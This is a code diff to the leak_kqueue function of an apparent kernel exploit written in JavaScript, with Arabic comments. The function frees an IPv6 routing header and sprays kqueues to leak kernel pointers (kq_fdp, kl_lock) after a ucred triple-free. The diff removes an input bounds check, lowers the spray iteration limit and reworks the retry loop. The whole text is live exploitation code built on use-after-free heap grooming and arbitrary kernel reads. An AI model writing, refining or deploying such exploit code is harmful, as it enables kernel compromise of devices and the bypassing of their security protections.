@@ -1519,12 +1519,6 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking kqueue...');
 
-  // تأكيد صلاحية triplets[1] قبل استخدامه
-  if (typeof triplets[1] === 'undefined' || triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
-    log('leak_kqueue: invalid triplets[1]');
-    return false;
-  }
-
   // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
 
@@ -1532,9 +1526,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-
-  // استخدام الثابت العالمي بدل MAX_KQ المحلي
-  var MAX_KQ = 6000;
+  var MAX_KQ = 5000;
 
   while (count < MAX_KQ) {
     count++;
@@ -1554,19 +1546,16 @@ function leak_kqueue() {
     var magic = read64(magic_add);
     var fdp   = read64(leak_rthdr.add(0x98));
 
-    // لو القراءة فاضية أو غير منطقية، نقفل kq ونكمل
-    if (!magic.eq(magic_val) || fdp.eq(0)) {
-      close(kq);
-      sched_yield();
-      continue;
+    if (magic.eq(magic_val) && !fdp.eq(0)) {
+      break;
     }
 
-    // وصلنا لقيمة صحيحة
-    break;
+    close(kq);
+    sched_yield();
   }
 
   if (count >= MAX_KQ) {
-    log('leak_kqueue: exceeded KQUEUE_ITERATIONS');
+    log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
   }
 
@@ -1580,7 +1569,6 @@ function leak_kqueue() {
 
   debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
 
-  // تأكيد إغلاق آخر kq مستخدم
   close(kq);
 
   // إعادة بناء triplets[1] بعد ما استخدمناه في free
